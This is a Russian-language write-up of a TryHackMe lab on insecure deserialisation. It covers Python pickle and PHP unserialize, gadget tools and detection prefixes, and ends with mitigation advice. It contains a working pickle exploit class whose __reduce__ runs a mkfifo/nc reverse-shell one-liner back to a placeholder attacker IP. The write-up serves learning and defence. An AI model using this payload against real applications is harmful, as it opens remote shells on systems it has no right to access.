# Insecure Deserialisation: десериализация недоверенных объектов

**Машина:** [Insecure Deserialisation](https://tryhackme.com/room/insecuredeserialisation) (medium, web)
**Суть:** приложение десериализует объекты от пользователя. В зависимости от формата, библиотек и доступных классов это может привести к выполнению кода.

## База

Сериализация — упаковка объекта в поток байт, десериализация — обратный процесс. Некоторые механизмы десериализации вызывают методы или функции при восстановлении объекта. Если атакующий управляет входными данными, а нужные функции или гаджеты доступны, это может дать выполнение кода.

## Python: pickle

```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc IP 4444 >/tmp/f',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
```

`__reduce__` говорит pickle, как восстановить объект — мы просим вызвать `os.system` с нашей командой. Приложение делает `pickle.loads(base64.b64decode(input))` — шелл.

## PHP: unserialize

`unserialize()` на пользовательском вводе + класс с `__wakeup()` или `__destruct()` = код внутри магического метода. Цепочки гаджетов (POP chains) собираются из классов, которые лежат рядом — инструменты: `phpggc`.

## Почему это везде

Java (Serializable, ysoserial), .NET (BinaryFormatter — официально не рекомендован), Ruby (Marshal), PHP, Python (pickle). Общая проблема — восстановление объектов из недоверенных данных. Возможность RCE зависит от конкретного механизма и доступных гаджетов.

## Как обнаружить

Для первичного поиска подходят характерные префиксы: у некоторых pickle-потоков в Base64 — `gASV`, у PHP-объектов — `O:<число>:"`. Это не универсальные признаки: сериализованные данные могут выглядеть иначе. Сериализованные объекты встречаются и в легитимных приложениях. Эти префиксы подходят для поиска, но WAF-правило не устраняет небезопасную десериализацию и не покрывает все форматы. В Python audit hook на `pickle.find_class` позволяет наблюдать разрешение классов и функций при десериализации, в том числе обращения к `os`/`subprocess`.

## Заметка

На входе лучше разбирать данные, а не восстанавливать произвольные объекты. JSON с проверкой схемы подходит для обычного обмена данными; для XML дополнительно нужна безопасная настройка парсера. Сам вызов десериализации ещё не определяет критичность: нужно проверить источник данных и доступные пути выполнения.
